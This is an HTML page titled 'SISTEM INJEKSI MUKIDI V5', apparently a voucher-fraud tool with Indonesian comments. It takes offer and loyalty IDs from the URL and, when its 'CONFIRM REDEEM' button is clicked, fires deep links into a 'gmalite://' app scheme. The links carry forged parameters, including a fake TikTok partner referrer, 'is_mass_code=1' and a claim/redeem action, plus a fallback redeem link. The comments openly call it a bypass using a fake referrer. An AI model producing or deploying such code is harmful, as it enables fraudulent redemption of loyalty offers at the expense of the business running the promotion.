<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SISTEM INJEKSI MUKIDI V5</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #da291c; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; text-align: center; }
        .container { background: white; padding: 30px; border-radius: 30px; width: 80%; color: #333; box-shadow: 0 15px 35px rgba(0,0,0,0.4); }
        .btn-inject { background: #ffbc0d; color: #222; border: none; padding: 20px; border-radius: 15px; width: 100%; font-weight: bold; font-size: 18px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
        .info { font-size: 12px; color: #666; margin-top: 15px; border-top: 1px solid #eee; padding-top: 10px; }
    </style>
</head>
<body>

    <div class="container">
        <h2 style="color:#da291c; margin-top:0;">INTERNAL AUTH</h2>
        <p style="font-size:14px;">Voucher detected. Click button below to finalize injection.</p>
        
        <button class="btn-inject" onclick="finalLaunch()">CONFIRM REDEEM</button>
        
        <div class="info">
            Target: <span id="display-id">Loading...</span><br>
            Status: <span style="color:green;">Secure Connection</span>
        </div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const off = params.get('offer_id');
        const loy = params.get('loyalty_id');
        document.getElementById('display-id').innerText = off;

        function finalLaunch() {
            if (!off || !loy) return alert("ID MISSING!");

            // LOGIKA BYPASS MUKIDI 2025
            // Kita pakai 'onelink' sebagai referrer palsu
            const partner = encodeURIComponent("Tiktok Live 109.4");
            const finalUrl = "gmalite://offers/details?" + 
                             "offer_id=" + off + 
                             "&loyalty_id=" + loy + 
                             "&view=claim" + 
                             "&action=redeem" + 
                             "&is_native=true" + 
                             "&is_mass_code=1" + 
                             "&partner=" + partner +
                             "&source=app_share"; // Parameter tambahan 2025

            // Tembak langsung
            window.location.href = finalUrl;
            
            // Backup jika tetap diam
            setTimeout(() => {
                window.location.href = "gmalite://offers/redeem?offer_id=" + off + "&loyalty_id=" + loy;
            }, 500);
        }
    </script>
</body>
</html>
